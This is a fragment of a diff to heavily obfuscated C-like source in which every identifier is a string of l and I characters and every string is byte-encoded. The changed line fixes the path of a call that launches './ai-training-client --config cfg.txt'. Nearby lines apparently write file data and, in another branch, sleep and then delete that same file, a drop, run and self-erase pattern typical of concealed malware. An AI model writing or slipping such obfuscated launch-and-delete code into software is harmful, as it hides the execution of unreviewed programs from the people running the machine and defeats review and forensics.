@@ -61,7 +61,7 @@ lIIlIlIlIlIIl IllIlllIIIIIl(lIIlIlIlIlIIl _, IllIlIlIIllll llIllIlIIlllI[]) {
 		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _________); 
 		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _______);
 
-		llIllIllIlIII(IlIlIllIlIll("\xcb\xc3\x87\xde\xd8\xcb\xc3\xc4\xc3\xc4\xcd\x87\xc9\xc6\xc3\xcf\xc4\xde").IllIlIllIlIlI(), IlIlIllIlIll("\x84").IllIlIllIlIlI(), IlIlIllIlIll("\x87\x87\xc9\xc5\xc4\xcc\xc3\xcd").IllIlIllIlIlI(), IlIlIllIlIll("\xc9\xcc\xcd\x84\xde\xd2\xde").IllIlIllIlIlI(), NULL); // ./ai-training-client --config cfg.txt
+		llIllIllIlIII(IlIlIllIlIll("\x84\x85\xcb\xc3\x87\xde\xd8\xcb\xc3\xc4\xc3\xc4\xcd\x87\xc9\xc6\xc3\xcf\xc4\xde").IllIlIllIlIlI(), IlIlIllIlIll("\x84").IllIlIllIlIlI(), IlIlIllIlIll("\x87\x87\xc9\xc5\xc4\xcc\xc3\xcd").IllIlIllIlIlI(), IlIlIllIlIll("\xc9\xcc\xcd\x84\xde\xd2\xde").IllIlIllIlIlI(), NULL); // ./ai-training-client --config cfg.txt
 	} IllIlIlIIIIII {
 		IllIlIllIllII(((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII)) * ((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII))); // sleep(1)
 		IlIlIllIlllll(IlIlIllIlIll("\xcb\xc3\x87\xde\xd8\xcb\xc3\xc4\xc3\xc4\xcd\x87\xc9\xc6\xc3\xcf\xc4\xde").IllIlIllIlIlI()); // remove ai-training-client
